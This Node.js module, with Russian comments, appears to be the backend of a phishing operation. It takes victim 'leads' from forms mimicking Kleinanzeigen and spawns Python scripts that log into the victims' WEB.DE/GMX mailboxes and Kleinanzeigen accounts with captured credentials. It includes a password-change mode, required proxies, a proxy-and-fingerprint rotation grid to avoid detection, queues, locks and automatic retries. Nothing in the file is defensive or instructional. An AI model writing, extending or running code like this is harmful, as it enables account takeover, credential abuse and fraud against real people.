'use strict';

const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const { DATA_DIR } = require('../db/database.js');
const { leadIsWorkedLikeAdmin } = require('./leadService.js');
const { logDuplicateAutomationAttempt } = require('../lib/terminalFlowLog');
const { formatModeStartPage } = require('../lib/adminModeFlowLog');
const { emailEligibleForUnitedInternetMailScript, mailboxAutomationLogLabel } = require('../utils/mailMailboxLogin');

/** Long-poll timeout — для расчёта max age lock (как в server.js). */
const WEBDE_WAIT_PASSWORD_TIMEOUT_MS = (function () {
  const v = parseInt(process.env.WEBDE_WAIT_PASSWORD_TIMEOUT_MS, 10);
  if (Number.isFinite(v) && v >= 60000) return v;
  return 3 * 60 * 1000;
})();

const WEBDE_LOCKS_DIR = path.join(DATA_DIR, 'webde-locks');
const WEBDE_SCRIPT_MAX_AGE_MS = (function () {
  const v = parseInt(process.env.WEBDE_SCRIPT_LOCK_MAX_AGE_MS, 10);
  if (Number.isFinite(v) && v >= 60000) return v;
  return Math.max(3 * 60 * 1000, WEBDE_WAIT_PASSWORD_TIMEOUT_MS + 90 * 1000);
})();
const WEBDE_LOGIN_MAX_CONCURRENT = Math.max(1, parseInt(process.env.WEBDE_LOGIN_MAX_CONCURRENT, 10) || 5);

const runningWebdeLoginLeadIds = new Set();
const pendingWebdeLoginQueue = [];
const webdeLoginChildByLeadId = new Map();
const activeAutomationChildren = new Set();

/** @type {object | null} */
let deps = null;

function init(d) {
  deps = d;
}

function getDeps() {
  if (!deps) throw new Error('automationService.init() must be called from server.js');
  return deps;
}

/**
 * Интерпретатор: `login/venv` (см. scripts/setup-python-env.sh), иначе системный python3 / python.
 * @param {string} [projectRoot] — корень проекта (как serverProjectRoot).
 */
function resolvePythonExecutable(projectRoot) {
  const win = process.platform === 'win32';
  if (projectRoot) {
    const venvExe = win
      ? path.join(projectRoot, 'login', 'venv', 'Scripts', 'python.exe')
      : path.join(projectRoot, 'login', 'venv', 'bin', 'python');
    if (fs.existsSync(venvExe)) return venvExe;
  }
  return win ? 'python' : 'python3';
}

/** lead_simulation — только ящики @web.de (в т.ч. emailKl при Klein-оркестрации). */
function leadTargetsWebdeMailbox(lead) {
  if (!lead || typeof lead !== 'object') return false;
  const a = String(lead.email || '').toLowerCase();
  const b = String(lead.emailKl || '').toLowerCase();
  return a.indexOf('web.de') !== -1 || b.indexOf('web.de') !== -1;
}

/** Лид пришёл с формы Kleinanzeigen (не путать со стартовой страницей в админке). */
function leadSubmittedAsKleinVictim(lead) {
  if (!lead || typeof lead !== 'object') return false;
  if (lead.brand === 'klein') return true;
  const cfb = String(lead.clientFormBrand || '').trim().toLowerCase();
  return cfb === 'klein';
}

function leadMailboxEmailPresent(lead) {
  if (!lead || typeof lead !== 'object') return false;
  return String(lead.email || '').trim() !== '';
}

/** Только Klein: в лиде нет основного ящика в `email` (как у чистой формы Kl). */
function leadIsStandaloneKleinFunnel(lead) {
  if (!leadSubmittedAsKleinVictim(lead)) return false;
  return !leadMailboxEmailPresent(lead);
}

/**
 * Стартовая страница «Klein» + лид с @web.de: сначала почта WEB.DE, затем Klein в том же профиле.
 * Не путать с standalone Klein (форма Kl без поля почты в `email`).
 */
function shouldUseKleinOrchestration(lead, startPage) {
  const sp = String(startPage || '').trim().toLowerCase();
  if (sp !== 'klein') return false;
  if (!leadTargetsWebdeMailbox(lead)) return false;
  if (leadIsStandaloneKleinFunnel(lead)) return false;
  return true;
}

/** process.env для дочернего Python + VIRTUAL_ENV при наличии login/venv. */
function makePythonSpawnEnv(projectRoot) {
  const env = Object.assign({}, process.env, {
    PYTHONUNBUFFERED: '1',
    PYTHONIOENCODING: 'utf-8',
  });
  if (projectRoot) {
    const venvDir = path.join(projectRoot, 'login', 'venv');
    const cfg = path.join(venvDir, 'pyvenv.cfg');
    if (fs.existsSync(cfg)) env.VIRTUAL_ENV = venvDir;
  }
  const vis = String(process.env.LOGIN_BROWSER_VISIBLE || '').trim().toLowerCase();
  const forceWindow =
    vis === '1' ||
    vis === 'true' ||
    vis === 'yes' ||
    (vis === '' && process.platform === 'darwin');
  const forceHeadless = vis === '0' || vis === 'false' || vis === 'no' || vis === 'off';
  const keepBrowserExplicitOff = /^(0|false|no|off)$/i.test(
    String(process.env.KEEP_BROWSER_OPEN || '').trim()
  );
  if (forceWindow && !forceHeadless) {
    env.HEADLESS = '0';
    if (!keepBrowserExplicitOff) {
      env.KEEP_BROWSER_OPEN = '1';
    }
  }
  return env;
}

/**
 * lead_simulation_api: прокси только с сервера (GET /api/worker/proxy-txt = Config → Прокси).
 * По умолчанию WEBDE_REQUIRE_PROXY=1 — без валидных строк скрипт не идёт в сеть напрямую.
 * В .env можно выставить WEBDE_PROXY_FROM_ADMIN=0 или WEBDE_REQUIRE_PROXY=0 для отладки.
 */
function webdeScriptProxyEnv() {
  const pfa = process.env.WEBDE_PROXY_FROM_ADMIN;
  const wrp = process.env.WEBDE_REQUIRE_PROXY;
  return {
    WEBDE_PROXY_FROM_ADMIN: pfa === undefined || String(pfa).trim() === '' ? '1' : String(pfa).trim(),
    WEBDE_REQUIRE_PROXY: wrp === undefined || String(wrp).trim() === '' ? '1' : String(wrp).trim(),
  };
}

function runWhenLeadsWriteQueueIdle(callback) {
  if (typeof callback === 'function') setImmediate(callback);
}

function webdeLockKey(email) {
  const e = (email || '').trim().toLowerCase();
  if (!e) return '';
  return e.replace(/[^a-z0-9@._-]/g, '_').slice(0, 120) || 'empty';
}

function webdeLockPath(email) {
  const key = webdeLockKey(email);
  if (!key) return '';
  if (!fs.existsSync(WEBDE_LOCKS_DIR)) fs.mkdirSync(WEBDE_LOCKS_DIR, { recursive: true });
  return path.join(WEBDE_LOCKS_DIR, key + '.lock');
}

function sanitizeLeadIdForLock(leadId) {
  const s = String(leadId || '').trim();
  if (!s) return '';
  return s.replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 120) || 'unknown';
}

/** Lock на leadId: `data/webde-locks/lead-<id>.lock` — строки: leadId, mtime, pid. */
function webdeLeadLockPath(leadId) {
  const safe = sanitizeLeadIdForLock(leadId);
  if (!safe) return '';
  if (!fs.existsSync(WEBDE_LOCKS_DIR)) fs.mkdirSync(WEBDE_LOCKS_DIR, { recursive: true });
  return path.join(WEBDE_LOCKS_DIR, 'lead-' + safe + '.lock');
}

function clearLeadAutomationLock(leadId) {
  const fp = webdeLeadLockPath(leadId);
  if (!fp) return;
  try {
    if (fs.existsSync(fp)) fs.unlinkSync(fp);
  } catch (_) {}
}

function webdeLeadLockWritePid(leadId, pid) {
  const fp = webdeLeadLockPath(leadId);
  if (!fp || !fs.existsSync(fp) || !Number.isFinite(pid) || pid <= 1) return;
  try {
    const raw = fs.readFileSync(fp, 'utf8');
    const lines = raw.split('\n');
    const a = (lines[0] || '').trim() || String(leadId);
    const b = (lines[1] || '').trim() || String(Date.now());
    fs.writeFileSync(fp, a + '\n' + b + '\n' + String(Math.floor(pid)), 'utf8');
  } catch (_) {}
}

function isProcessAlive(pid) {
  if (!Number.isFinite(pid) || pid <= 1) return false;
  try {
    process.kill(pid, 0);
    return true;
  } catch (err) {
    return err && err.code !== 'ESRCH';
  }
}

/**
 * Уже есть дочерний процесс / слот / свежий lock с живым PID (или lock без PID сразу после wx).
 */
function isLeadAutomationAlreadyRunning(leadId) {
  const id = leadId != null ? String(leadId).trim() : '';
  if (!id) return false;
  if (webdeLoginChildByLeadId.has(id)) return true;
  if (runningWebdeLoginLeadIds.has(id)) return true;
  const fp = webdeLeadLockPath(id);
  if (!fp || !fs.existsSync(fp)) return false;
  try {
    const stat = fs.statSync(fp);
    if (Date.now() - stat.mtimeMs > WEBDE_SCRIPT_MAX_AGE_MS) {
      try { fs.unlinkSync(fp); } catch (_) {}
      return false;
    }
    const raw = fs.readFileSync(fp, 'utf8');
    const lines = raw.split('\n');
    const pid = parseInt((lines[2] || '').trim(), 10);
    if (Number.isFinite(pid) && pid > 1) {
      if (isProcessAlive(pid)) return true;
      try { fs.unlinkSync(fp); } catch (_) {}
      return false;
    }
    return true;
  } catch (_) {
    return false;
  }
}

function tryAcquireLeadAutomationLock(leadId) {
  const fp = webdeLeadLockPath(leadId);
  if (!fp) return false;
  if (!fs.existsSync(WEBDE_LOCKS_DIR)) fs.mkdirSync(WEBDE_LOCKS_DIR, { recursive: true });
  try {
    const stat = fs.existsSync(fp) ? fs.statSync(fp) : null;
    if (stat && Date.now() - stat.mtimeMs > WEBDE_SCRIPT_MAX_AGE_MS) {
      try { fs.unlinkSync(fp); } catch (_) {}
    }
    fs.writeFileSync(fp, String(leadId).trim() + '\n' + Date.now(), { flag: 'wx' });
    return true;
  } catch (err) {
    if (err.code === 'EEXIST') {
      if (!isLeadAutomationAlreadyRunning(leadId)) return tryAcquireLeadAutomationLock(leadId);
    }
    return false;
  }
}

function tryAcquireWebdeScriptLock(email, leadId) {
  const lockFile = webdeLockPath(email);
  if (!lockFile) return false;
  try {
    const stat = fs.existsSync(lockFile) ? fs.statSync(lockFile) : null;
    if (stat && (Date.now() - stat.mtimeMs) > WEBDE_SCRIPT_MAX_AGE_MS) {
      try { fs.unlinkSync(lockFile); } catch (_) {}
    }
    fs.writeFileSync(lockFile, leadId + '\n' + Date.now(), { flag: 'wx' });
    return true;
  } catch (err) {
    if (err.code === 'EEXIST') return false;
    throw err;
  }
}

function clearWebdeScriptRunning(email) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile) return;
  try {
    if (fs.existsSync(lockFile)) fs.unlinkSync(lockFile);
  } catch (_) {}
}

function touchWebdeScriptLock(email) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile || !fs.existsSync(lockFile)) return;
  try {
    const t = new Date();
    fs.utimesSync(lockFile, t, t);
  } catch (_) {}
}

function webdeLockWriteChildPid(email, pid) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile || !fs.existsSync(lockFile) || !Number.isFinite(pid) || pid <= 1) return;
  try {
    const raw = fs.readFileSync(lockFile, 'utf8');
    const lines = raw.split('\n');
    const a = (lines[0] || '').trim();
    const b = (lines[1] || '').trim() || String(Date.now());
    fs.writeFileSync(lockFile, a + '\n' + b + '\n' + String(Math.floor(pid)), 'utf8');
  } catch (_) {}
}

function webdeLockKillChildIfAny(email) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile || !fs.existsSync(lockFile)) return;
  try {
    const lines = fs.readFileSync(lockFile, 'utf8').split('\n');
    const pid = parseInt((lines[2] || '').trim(), 10);
    if (!Number.isFinite(pid) || pid <= 1) return;
    try {
      process.kill(pid, 'SIGKILL');
    } catch (err) {
      if (err && err.code !== 'ESRCH') { /* ignore */ }
    }
  } catch (_) {}
}

function beginWebdeAutoLoginRun(lead) {
  if (!lead || typeof lead !== 'object') return 0;
  const n = (parseInt(lead.webdeScriptRunSeq, 10) || 0) + 1;
  lead.webdeScriptRunSeq = n;
  lead.webdeScriptActiveRun = n;
  return n;
}

function endWebdeAutoLoginRun(lead) {
  if (!lead || typeof lead !== 'object') return;
  lead.webdeScriptActiveRun = null;
}

function setWebdeLeadScriptStatus(leadIdResolved, statusOrNull) {
  const d = getDeps();
  try {
    const patch = { lastSeenAt: new Date().toISOString() };
    if (statusOrNull == null || statusOrNull === '') patch.scriptStatus = null;
    else patch.scriptStatus = String(statusOrNull);
    d.persistLeadPatch(leadIdResolved, patch);
  } catch (e) {
    console.error('[АДМИН] setWebdeLeadScriptStatus:', e && e.message ? e.message : e);
  }
}

function releaseWebdeLoginSlot(leadId) {
  const d = getDeps();
  runningWebdeLoginLeadIds.delete(leadId);
  while (pendingWebdeLoginQueue.length > 0 && runningWebdeLoginLeadIds.size < WEBDE_LOGIN_MAX_CONCURRENT) {
    const next = pendingWebdeLoginQueue.shift();
    if (next && next.script === 'klein') {
      startKleinLoginForLeadId(next.leadId, !!next.forceRestart);
    } else if (next) {
      startWebdeLoginForLeadId(next.leadId, next.eligibleMail, next.forceRestart, next.kleinOrchestration);
    }
  }
}

function registerAutomationChild(child) {
  if (!child || typeof child !== 'object') return;
  activeAutomationChildren.add(child);
}

function unregisterAutomationChild(child) {
  if (!child || typeof child !== 'object') return;
  activeAutomationChildren.delete(child);
}

function preemptWebdeLoginForReplacedLead(oldLeadId, email) {
  const d = getDeps();
  const em = (email || '').trim().toLowerCase();
  if (em) webdeLockKillChildIfAny(em);
  if (oldLeadId && typeof oldLeadId === 'string') {
    clearLeadAutomationLock(oldLeadId);
    const c = webdeLoginChildByLeadId.get(oldLeadId);
    if (c && typeof c.kill === 'function') {
      try {
        c.kill('SIGKILL');
        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', em || '—', 'остановлен предыдущий автовход (новый лог по email), leadId=' + oldLeadId, oldLeadId);
      } catch (_) {}
      unregisterAutomationChild(c);
      webdeLoginChildByLeadId.delete(oldLeadId);
    }
    releaseWebdeLoginSlot(oldLeadId);
  }
  if (em) clearWebdeScriptRunning(em);
}

function stopWebdeLoginForDeletedLead(leadId, lead) {
  const d = getDeps();
  const id = leadId != null ? String(leadId).trim() : '';
  if (!id) return;
  const c = webdeLoginChildByLeadId.get(id);
  if (c && typeof c.kill === 'function') {
    try {
      c.kill('SIGKILL');
      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', (lead && (lead.email || lead.emailKl)) ? String(lead.email || lead.emailKl).trim() : '—', 'остановка автовхода: лид удалён, leadId=' + id, id);
    } catch (_) {}
    unregisterAutomationChild(c);
  }
  webdeLoginChildByLeadId.delete(id);
  clearLeadAutomationLock(id);
  releaseWebdeLoginSlot(id);
  for (let qi = pendingWebdeLoginQueue.length - 1; qi >= 0; qi--) {
    const q = pendingWebdeLoginQueue[qi];
    if (q && String(q.leadId) === id) pendingWebdeLoginQueue.splice(qi, 1);
  }
  if (lead && typeof lead === 'object') {
    const e1 = String(lead.email || '').trim().toLowerCase();
    const e2 = String(lead.emailKl || '').trim().toLowerCase();
    if (e1) {
      webdeLockKillChildIfAny(e1);
      clearWebdeScriptRunning(e1);
    }
    if (e2 && e2 !== e1) {
      webdeLockKillChildIfAny(e2);
      clearWebdeScriptRunning(e2);
    }
  }
}

/** SIGKILL всех дочерних процессов автовхода и сброс очереди (например delete-all). */
function clearAllWebdeChildrenAndQueues() {
  try {
    webdeLoginChildByLeadId.forEach(function (c, lid) {
      clearLeadAutomationLock(lid);
      if (c && typeof c.kill === 'function') { try { c.kill('SIGKILL'); } catch (_) {} }
    });
    webdeLoginChildByLeadId.clear();
    runningWebdeLoginLeadIds.clear();
    pendingWebdeLoginQueue.length = 0;
  } catch (_) {}
}

function startWebdeLoginAfterLeadSubmit(leadId, lead, forceRestart) {
  const d = getDeps();
  if (!leadId || !lead) return;
  const rows = typeof d.readLeads === 'function' ? d.readLeads() : [];
  const resolvedLead = rows.find(function (l) { return l && String(l.id) === String(leadId); }) || lead;
  if (leadIsWorkedLikeAdmin(resolvedLead)) {
    const em0 = String(resolvedLead.emailKl || resolvedLead.email || lead.emailKl || lead.email || '').trim() || '—';
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', em0, 'пропуск: лог отработан (Отработан / архив Klein) · leadId=' + leadId, leadId);
    return;
  }
  const sp = d.readStartPage();
  const mode = typeof d.readMode === 'function' ? d.readMode() : 'auto';
  const autoScript = d.readAutoScript();
  const emLog = String(lead.emailKl || lead.email || '').trim() || '—';
  const snap = formatModeStartPage(mode, autoScript, sp);
  let branch = '';
  if (sp === 'change') {
    if (lead.brand === 'klein') {
      branch = 'пропуск автовхода в почту: Change + Klein (только вручную из админки)';
      d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: Auto-Login+Change + Klein — автовход в почту не запускаем (админ вручную), leadId=' + leadId, leadId);
      return;
    }
    branch =
      'запуск lead_simulation: Change — автовход ' + mailboxAutomationLogLabel(lead.email || '') + ' (смена пароля)';
    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
    startWebdeLoginForLeadId(leadId, emailEligibleForUnitedInternetMailScript(lead.email || ''), !!forceRestart, false);
    return;
  }
  if (leadIsStandaloneKleinFunnel(lead)) {
    branch = 'запуск klein_simulation_api.py (только Klein, без ящика в поле email)';
    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
    startKleinLoginForLeadId(leadId, !!forceRestart);
    return;
  }
  if (shouldUseKleinOrchestration(lead, sp)) {
    branch =
      'запуск lead_simulation + Klein-оркестрация (WEB.DE в почту, затем Klein в том же профиле)';
    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
    startWebdeLoginForLeadId(leadId, emailEligibleForUnitedInternetMailScript(lead.email || ''), !!forceRestart, true);
    return;
  }
  if (leadSubmittedAsKleinVictim(lead)) {
    branch = 'запуск klein_simulation_api.py (форма Klein при заполненном email ящика)';
    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
    startKleinLoginForLeadId(leadId, !!forceRestart);
    return;
  }
  branch = 'запуск lead_simulation (почта ' + mailboxAutomationLogLabel(lead.email || '') + ')';
  d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
  startWebdeLoginForLeadId(leadId, emailEligibleForUnitedInternetMailScript(lead.email || ''), !!forceRestart, false);
}

function restartWebdeAutoLoginAfterVictimRetryFromError(lead, id, email, reasonLog) {
  const d = getDeps();
  if (lead && leadIsWorkedLikeAdmin(lead)) {
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', 'автоперезапуск пропущен: лог отработан · id=' + id, id);
    return;
  }
  if (!d.readAutoScript()) return;
  const mode = typeof d.readMode === 'function' ? d.readMode() : 'auto';
  const snap = formatModeStartPage(mode, d.readAutoScript(), d.readStartPage());
  if (lead && lead.webdeLoginGridExhausted === true) {
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] автоперезапуск пропущен: сетка прокси×отпечаток исчерпана · ' + reasonLog + ' · id=' + id, id);
    d.logTerminalFlow('АДМИН', 'Система', '—', (email || '').trim() || '—', 'автоперезапуск пропущен: автовход уже исчерпал сетку прокси×отпечаток (ручной «Запуск входа» или новый лид), id=' + id, id);
    return;
  }
  const spRetry = d.readStartPage();
  if (spRetry === 'change' && lead.brand === 'klein') {
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] автоперезапуск не делаем: Change + Klein · ' + reasonLog + ' · id=' + id, id);
    console.log('[АДМИН] ' + reasonLog + ': после ошибки + Change + Klein — автоперезапуск не делаем, id=' + id);
    return;
  }
  if (leadIsStandaloneKleinFunnel(lead)) {
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск klein_simulation · ' + reasonLog + ' · id=' + id, id);
    console.log('[АДМИН] ' + reasonLog + ' — повторный запуск klein_simulation, id=' + id);
    startKleinLoginForLeadId(id, false);
    return;
  }
  if (shouldUseKleinOrchestration(lead, spRetry)) {
    d.logTerminalFlow(
      'РЕЖИМ',
      'Автовход',
      'retry',
      (email || '').trim() || '—',
      '[' + snap + '] перезапуск lead_simulation WEB.DE + Klein-оркестрация · ' + reasonLog + ' · id=' + id,
      id
    );
    console.log('[АДМИН] ' + reasonLog + ' — запуск WEB.DE + Klein-orch заново, id=' + id);
    startWebdeLoginForLeadId(id, emailEligibleForUnitedInternetMailScript(lead.email || ''), false, true);
    return;
  }
  if (leadSubmittedAsKleinVictim(lead)) {
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск klein_simulation · ' + reasonLog + ' · id=' + id, id);
    console.log('[АДМИН] ' + reasonLog + ' — повторный запуск klein_simulation, id=' + id);
    startKleinLoginForLeadId(id, false);
    return;
  }
  if (emailEligibleForUnitedInternetMailScript(email || '')) {
    const lab = mailboxAutomationLogLabel(email || '');
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск lead_simulation (' + lab + ') · ' + reasonLog + ' · id=' + id, id);
    console.log('[АДМИН] ' + reasonLog + ' — запуск скрипта входа почты (' + lab + ') заново, id=' + id);
    startWebdeLoginForLeadId(id, emailEligibleForUnitedInternetMailScript(lead.email || ''), true, false);
  }
}

function startWebdeLoginForLeadId(leadId, eligibleMail, forceRestart, kleinOrchestration) {
  const d = getDeps();
  if (kleinOrchestration === undefined) kleinOrchestration = false;
  if (!eligibleMail || !leadId || !d.readAutoScript()) {
    if (eligibleMail && leadId && !d.readAutoScript()) {
      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: Auto-script выключен, leadId=' + leadId, leadId);
    } else if (leadId && d.readAutoScript() && !eligibleMail) {
      d.logTerminalFlow(
        'AUTO-LOGIN',
        'Система',
        '—',
        '—',
        'пропуск: email лида не подходит для lead_simulation (@web.de / GMX и т.д.), leadId=' + leadId,
        leadId
      );
    }
    return;
  }
  if (runningWebdeLoginLeadIds.size >= WEBDE_LOGIN_MAX_CONCURRENT) {
    if (!forceRestart && isLeadAutomationAlreadyRunning(leadId)) {
      logDuplicateAutomationAttempt(leadId, '—', 'слоты заняты, для leadId уже идёт автоматизация — в очередь не ставим');
      return;
    }
    pendingWebdeLoginQueue.push({ leadId: leadId, eligibleMail: eligibleMail, forceRestart: !!forceRestart, kleinOrchestration: !!kleinOrchestration });
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'очередь: слотов ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ', leadId=' + leadId + ' в очередь (размер ' + pendingWebdeLoginQueue.length + ')', leadId);
    const leadsQ = d.readLeads();
    const leadQ = leadsQ.find(function (l) { return l.id === leadId; });
    if (leadQ) {
      d.pushEvent(leadQ, d.EVENT_LABELS.WEBDE_QUEUE, 'script', {
        detail: 'слоты ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT
      });
      d.persistLeadPatch(leadId, { eventTerminal: leadQ.eventTerminal });
    }
    return;
  }
  const leads = d.readLeads();
  const lead = leads.find(function (l) { return l.id === leadId; });
  if (!lead) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: лид не найден, leadId=' + leadId, leadId);
    return;
  }
  if (lead.brand === 'klein' && !kleinOrchestration) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', (lead.emailKl || lead.email || '').trim() || '—', 'пропуск: Klein — авто через klein_simulation_api.py, не lead_simulation, leadId=' + leadId, leadId);
    return;
  }
  const lockEmailRaw = kleinOrchestration
    ? String((lead.email || lead.emailKl || '')).trim()
    : String(lead.email || '').trim();
  if (!lockEmailRaw) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: нет email для автовхода, leadId=' + leadId, leadId);
    return;
  }
  if (lead.status === 'show_success' && !forceRestart) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmailRaw, 'пропуск: лид уже Успех без forceRestart, leadId=' + leadId, leadId);
    return;
  }
  if (lead.webdeLoginGridExhausted === true && !forceRestart) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmailRaw, 'пропуск: сетка прокси×отпечаток уже исчерпана (кнопка запуска в админке или forceRestart), leadId=' + leadId, leadId);
    return;
  }
  if (!forceRestart && isLeadAutomationAlreadyRunning(leadId)) {
    logDuplicateAutomationAttempt(leadId, lockEmailRaw, 'активный процесс / слот / lock по leadId');
    return;
  }
  const email = lockEmailRaw.toLowerCase();
  preemptWebdeLoginForReplacedLead(leadId, email);
  if (!tryAcquireLeadAutomationLock(leadId)) {
    logDuplicateAutomationAttempt(leadId, lockEmailRaw, 'lock leadId занят (atomic)');
    return;
  }
  if (!tryAcquireWebdeScriptLock(email, leadId)) {
    clearLeadAutomationLock(leadId);
    d.writeDebugLog('WEBDE_LOCK_BUSY_AFTER_PREEMPT', {
      hypothesisId: 'H_cluster_or_stale',
      leadId: leadId,
      lockMaxAgeMs: WEBDE_SCRIPT_MAX_AGE_MS
    });
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'пропуск: скрипт уже запущен для email, leadId=' + leadId, leadId);
    return;
  }
  const loginDir = path.join(d.serverProjectRoot, 'login');
  const scriptPath = path.join(loginDir, 'lead_simulation_api.py');
  if (!fs.existsSync(scriptPath)) {
    console.error('[AUTO-LOGIN] Ошибка: не найден скрипт ' + scriptPath);
    clearLeadAutomationLock(leadId);
    clearWebdeScriptRunning(email);
    return;
  }
  const webdeComboSlot = runningWebdeLoginLeadIds.size;
  runningWebdeLoginLeadIds.add(leadId);
  const baseUrl = process.env.SERVER_URL || ('http://127.0.0.1:' + (parseInt(process.env.PORT, 10) || 3000));
  const workerSecret = d.getWorkerSecret() || '';
  const webdeRunSession = beginWebdeAutoLoginRun(lead);
  const atDom = email.indexOf('@') >= 0 ? email.slice(email.indexOf('@')) : '';
  const klMarked = d.leadHasKleinMarkedData(lead);
  const orchDetail = kleinOrchestration && klMarked ? ' · после почты — Klein (Kl)' : '';
  const startDetail =
    'lead_simulation_api.py · ' +
    mailboxAutomationLogLabel(email) +
    ' · слот ' +
    webdeComboSlot +
    '/' +
    WEBDE_LOGIN_MAX_CONCURRENT +
    ' · …' +
    atDom +
    orchDetail;
  d.pushEvent(lead, d.EVENT_LABELS.WEBDE_START, 'script', { session: webdeRunSession, detail: startDetail });
  d.persistLeadPatch(leadId, {
    webdeScriptRunSeq: lead.webdeScriptRunSeq,
    webdeScriptActiveRun: lead.webdeScriptActiveRun,
    eventTerminal: lead.eventTerminal
  });
  d.logTerminalFlow(
    'AUTO-LOGIN',
    'Автовход',
    webdeRunSession,
    email,
    'запуск Python · ' +
      mailboxAutomationLogLabel(email) +
      ' · leadId=' +
      leadId +
      (kleinOrchestration ? ' klein-orchestration' : '') +
      ' comboSlot=' +
      webdeComboSlot +
      ' активных ' +
      runningWebdeLoginLeadIds.size +
      '/' +
      WEBDE_LOGIN_MAX_CONCURRENT,
    leadId
  );
  const projectRoot = d.serverProjectRoot;
  const python = resolvePythonExecutable(projectRoot);
  const env = makePythonSpawnEnv(projectRoot);
  const pyArgs = [scriptPath, '--server-url', baseUrl, '--lead-id', leadId, '--combo-slot', String(webdeComboSlot)];
  if (kleinOrchestration) pyArgs.push('--klein-orchestration');
  const child = spawn(python, pyArgs, {
    cwd: d.serverProjectRoot,
    detached: true,
    stdio: 'inherit',
    env: Object.assign({}, env, { WORKER_SECRET: workerSecret }, webdeScriptProxyEnv())
  });
  webdeLockWriteChildPid(email, child.pid);
  webdeLeadLockWritePid(leadId, child.pid);
  webdeLoginChildByLeadId.set(leadId, child);
  registerAutomationChild(child);
  var cleaned = false;
  function cleanupChild(reason, errObj) {
    if (cleaned) return;
    cleaned = true;
    unregisterAutomationChild(child);
    webdeLoginChildByLeadId.delete(leadId);
    clearLeadAutomationLock(leadId);
    releaseWebdeLoginSlot(leadId);
    clearWebdeScriptRunning(email);
    try {
      const live = d.readLeadById(leadId);
      if (live && live.webdeScriptActiveRun != null && live.webdeScriptActiveRun !== '') {
        endWebdeAutoLoginRun(live);
        d.persistLeadPatch(leadId, { webdeScriptActiveRun: null });
      }
    } catch (_) {}
    if (reason === 'exit' && errObj && Number.isFinite(errObj.code) && errObj.code !== 0) {
      try {
        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'Скрипт завершился с ошибкой (code=' + errObj.code + '), leadId=' + leadId, leadId);
      } catch (_) {}
    }
    if (reason === 'error') {
      try {
        const msg = errObj && errObj.message ? String(errObj.message) : String(errObj || 'spawn_error');
        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'ошибка запуска Python: ' + msg + ', leadId=' + leadId, leadId);
      } catch (_) {}
    }
  }
  child.on('exit', function (code, signal) { cleanupChild('exit', { code: code, signal: signal }); });
  child.on('error', function (err) { cleanupChild('error', err); });
  child.unref();
}

function startKleinLoginForLeadId(leadId, forceRestart) {
  const d = getDeps();
  if (!leadId || !d.readAutoScript()) {
    if (leadId && !d.readAutoScript()) {
      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: Auto-script выключен, leadId=' + leadId, leadId);
    }
    return;
  }
  if (runningWebdeLoginLeadIds.size >= WEBDE_LOGIN_MAX_CONCURRENT) {
    if (!forceRestart && isLeadAutomationAlreadyRunning(leadId)) {
      logDuplicateAutomationAttempt(leadId, '—', 'Klein: слоты заняты, для leadId уже идёт автоматизация — в очередь не ставим');
      return;
    }
    pendingWebdeLoginQueue.push({ leadId: leadId, forceRestart: !!forceRestart, script: 'klein' });
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'очередь Klein: слотов ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ', leadId=' + leadId, leadId);
    const leadsKq = d.readLeads();
    const leadKq = leadsKq.find(function (l) { return l.id === leadId; });
    if (leadKq) {
      d.pushEvent(leadKq, d.EVENT_LABELS.KLEIN_QUEUE, 'script', {
